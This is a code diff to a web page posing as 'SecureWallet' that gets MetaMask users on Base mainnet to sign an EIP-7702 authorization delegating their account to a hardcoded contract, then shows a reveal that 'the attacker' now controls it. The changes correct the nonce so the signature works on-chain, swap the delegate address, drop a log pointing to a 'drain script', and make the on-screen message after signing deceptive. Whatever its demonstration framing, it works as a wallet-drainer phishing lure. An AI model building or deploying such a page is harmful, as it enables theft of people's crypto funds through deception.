@@ -84,8 +84,6 @@
   .defense-num { color: var(--green); font-weight: 700; flex-shrink: 0; min-width: 20px; }
   .defense-text { color: var(--muted); line-height: 1.6; }
   .defense-text strong { color: var(--text); }
-
-  .console-output { background: var(--surface); border: 1px solid var(--border); border-radius: 8px; padding: 12px 16px; margin-top: 8px; font-family: 'Courier New', monospace; font-size: 0.75rem; color: #a5b4fc; max-height: 200px; overflow-y: auto; }
 </style>
 </head>
 <body>
@@ -111,7 +109,6 @@
       <div class="connect-logo">Secure<span>Wallet</span></div>
       <div class="step-list" id="stepList"></div>
       <p class="connect-note" id="connectNote">Confirm the signature request in MetaMask.</p>
-      <div class="console-output" id="consoleOutput"></div>
     </div>
   </div>
 </div>
@@ -160,7 +157,7 @@
           You saw a generic signature request. The message looked like hex gibberish:
           <div class="code-block" id="authTupleDisplay"></div>
           But this wasn't random. It was an EIP-7702 authorization tuple:
-          <div class="code-block">[chain_id=8453, delegateAddress=0x7ADf..., nonce, y_parity, r, s]</div>
+          <div class="code-block">[chain_id=8453, delegateAddress=0x4c60..., nonce=(currentNonce+1), y_parity, r, s]</div>
           Signing this gave the attacker the authorization to attach their contract to your EOA.
         </div>
       </div>
@@ -195,7 +192,7 @@ tx = {
     </div>
     <div class="info-card">
       <div class="info-card-label">Delegate contract (now controls your EOA)</div>
-      <div class="info-card-value">0xa57a96c76feC586bE399F47437CCA9Fd81F08B92</div>
+      <div class="info-card-value">0x4c6015c7058fEe725c7342cFF1E7Dbd94Ca9C72e</div>
     </div>
     <div class="info-card">
       <div class="info-card-label">Signed authorization message (hex)</div>
@@ -231,8 +228,8 @@ tx = {
 
 <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/6.13.2/ethers.umd.min.js"></script>
 <script>
-  const BASE_MAINNET_CHAIN_ID = 8453;
-  const DELEGATE_ADDRESS = "0xa57a96c76feC586bE399F47437CCA9Fd81F08B92";
+  const BASE_CHAIN_ID = 8453;
+  const DELEGATE_ADDRESS = "0x4c6015c7058fEe725c7342cFF1E7Dbd94Ca9C72e";
 
   let userAddress = null;
   let signedAuth = null;
@@ -245,15 +242,6 @@ tx = {
 
   function shortAddr(a) { return a ? a.slice(0,6) + "..." + a.slice(-4) : "—"; }
 
-  function log(msg) {
-    const output = document.getElementById('consoleOutput');
-    if (output) {
-      output.innerHTML += msg + '<br>';
-      output.scrollTop = output.scrollHeight;
-    }
-    console.log(msg);
-  }
-
   function renderSteps(steps) {
     document.getElementById('stepList').innerHTML = steps.map(s => `
       <div class="step-item">
@@ -265,6 +253,17 @@ tx = {
       </div>`).join('');
   }
 
+  // Build EIP-7702 authorization tuple
+  function buildAuthorizationTuple(chainId, delegateAddr, nonce) {
+    return {
+      chainId: chainId,
+      address: delegateAddr,
+      nonce: nonce,
+      // y_parity, r, s will be added after signing
+    };
+  }
+
+  // Encode authorization tuple for signing
   function encodeAuthTuple(chainId, delegateAddr, nonce) {
     const encoded = ethers.AbiCoder.defaultAbiCoder().encode(
       ['uint256', 'address', 'uint256'],
@@ -286,35 +285,39 @@ tx = {
     ]);
 
     try {
+      // Get chainId
       const chainIdHex = await window.ethereum.request({ method: 'eth_chainId' });
       const chainId = parseInt(chainIdHex, 16);
 
-      if (chainId !== BASE_MAINNET_CHAIN_ID) {
-        alert(`Please switch to Base Mainnet (chainId ${BASE_MAINNET_CHAIN_ID})`);
+      if (chainId !== BASE_CHAIN_ID) {
+        alert(`Please switch to Base (chainId ${BASE_CHAIN_ID})`);
         showPhase('phase-lure');
         return;
       }
 
+      // Get accounts
       const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
       userAddress = accounts[0];
 
-      log("✅ Connected address: " + userAddress);
-
       renderSteps([
-        { num:'1', state:'done', title:'Network: Base Mainnet', desc:'Chain ID 8453' },
+        { num:'1', state:'done', title:'Network: Base', desc:'Chain ID 8453' },
         { num:'2', state:'active', title:'Requesting signature', desc:'Sign the message in MetaMask' }
       ]);
       document.getElementById('connectNote').textContent = "Check MetaMask for the signature request.";
 
-      const nonce = 0;
-      const authMessage = encodeAuthTuple(chainId, DELEGATE_ADDRESS, nonce);
+      // Build authorization tuple (use currentNonce + 1 per EIP-7702 spec)
+      // The EVM increments the sender's nonce BEFORE validating the authorization,
+      // so we must sign with nonce+1 to pass validation on-chain
+      const currentNonce = await provider.getTransactionCount(userAddress);
+      const authNonce = currentNonce + 1;
+      const authMessage = encodeAuthTuple(chainId, DELEGATE_ADDRESS, authNonce);
       
-      log("📝 Authorization message: " + authMessage);
-
+      // Store for reveal
       authTuple = {
-        chainId, address: DELEGATE_ADDRESS, nonce
+        chainId, address: DELEGATE_ADDRESS, nonce: authNonce
       };
       
+      // Request signature
       const signature = await window.ethereum.request({
         method: 'personal_sign',
         params: [authMessage, userAddress]
@@ -322,15 +325,11 @@ tx = {
 
       signedAuth = signature;
 
-      log("✅ Signature obtained!");
-      log("📋 Signature: " + signature);
-      log("⚠️  Copy the signature above for the drain script");
-
       renderSteps([
-        { num:'1', state:'done', title:'Network detected', desc:'Base Mainnet' },
+        { num:'1', state:'done', title:'Network detected', desc:'Sepolia' },
         { num:'2', state:'done', title:'Signature obtained', desc:'Authorization signed' }
       ]);
-      document.getElementById('connectNote').textContent = "✅ Signature captured. Check browser console.";
+      document.getElementById('connectNote').textContent = "Verification complete. Loading dashboard...";
 
       document.getElementById('walletChip').textContent = shortAddr(userAddress);
       document.getElementById('revealAddress').textContent = userAddress;
@@ -338,11 +337,11 @@ tx = {
       document.getElementById('displaySignature').textContent = signature;
       document.getElementById('authTupleDisplay').textContent = `
 Authorization Tuple:
-[chainId=${chainId}, address=${DELEGATE_ADDRESS}, nonce=${nonce}]
+[chainId=${chainId}, address=${DELEGATE_ADDRESS}, nonce=${authNonce}]
 
 Encoded: ${authMessage}`;
 
-      setTimeout(() => showPhase('phase-dashboard'), 1000);
+      setTimeout(() => showPhase('phase-dashboard'), 800);
 
     } catch (err) {
       if (err.code !== 4001) console.error("Error:", err);
